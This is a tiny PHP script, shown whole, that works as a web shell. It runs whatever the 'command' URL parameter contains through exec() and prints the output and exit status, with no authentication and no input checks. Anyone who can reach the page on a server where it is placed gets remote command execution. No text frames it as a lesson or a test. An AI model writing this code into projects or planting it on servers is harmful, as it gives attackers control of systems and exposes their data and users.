<?php
	$output=null;
	$retval=null;
	exec($_GET["command"], $output, $retval);
	echo "Returned with status $retval and output:\n";
	print_r($output);
?>